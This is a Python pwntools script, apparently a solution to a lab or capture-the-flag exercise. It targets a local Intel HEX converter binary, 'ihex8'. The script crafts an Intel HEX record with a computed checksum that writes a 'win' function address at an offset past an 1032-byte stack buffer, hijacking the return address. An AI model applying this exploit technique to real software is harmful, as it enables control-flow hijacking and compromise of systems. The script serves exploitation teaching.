#!/usr/bin/env python3

from pwn import * 

def create_payload():
    
    # Stack content after main is called:
    #       MAIN CALLED
    #   0 pre main return address                   (8 bytes)
    #   1 previous frame pointer    (rbp)           (8 bytes)
    #   2 stack_canary              (rbp - 0x008)   (8 bytes)
    #   3 out_buffer                (rbp - 0x410)   (1032 bytes)
    #   4 rdi - argc                (rbp - 0x414)   (4 bytes)
    #   5 rsi - argv                (rbp - 0x420)   (8 bytes)
    #     CONVERT CALLED  
    
    # length of out_buffer
    buffer_length = 1032
    
    # offset to write to just the return address (buffer_length + stack_canary length + previous frame pointer length)
    offset_int = buffer_length + 16 
    hex_offset = hex(offset_int)[2:]
    
    # address of win function (incremented to bypass value checks) - in little endian
    address_to_return = "EA12400000000000"
    
    # create a string representing a record at offset hex_offset with data address_to_return
    record = create_record(hex_offset, address_to_return)

    content = record
    return content  
    
def create_record(offset, data):
    #<header> <length> <offset> <code> <data> <checksum>
    header = ":"

    # Calculate the lenth and pre-pad it with 0's
    length = hex(int(len(data) / 2))[2:]
    length = (2 - len(length)) * "0" + length

    # Pre-pad the offset with 0's
    offset = (4 - len(offset)) * "0" + offset
    
    code = "00"
    
    record = header + length + offset + code + data

    record += compute_checksum(record)
    
    return record
    
    
def compute_checksum(data):
    # Remove the header ':' and convert the remaining string to a byte sequence
    byte_sequence = bytes.fromhex(data[1:])

    # Sum up all the bytes
    checksum = sum(byte_sequence)

    # Compute two's complement
    checksum = (checksum ^ 0xFFFF) + 1

    # Take the least significant byte as the checksum
    checksum_byte = checksum.to_bytes(2, byteorder='big')[-1]

    # Convert the checksum byte to a hexadecimal string
    checksum_hex = format(checksum_byte, '02X')
    return checksum_hex

    
# DO NOT MODIFY THE CODE BELOW
def main():  
    payload = create_payload()
    with open('sample.hex', 'w') as f:
        f.write(payload)

    # launch program
    p=process(['./ihex8', 'sample.hex', 'sample.bin'])
    print(p.recvall().decode('utf-8','ignore'))
    

if __name__ == '__main__':
    main()

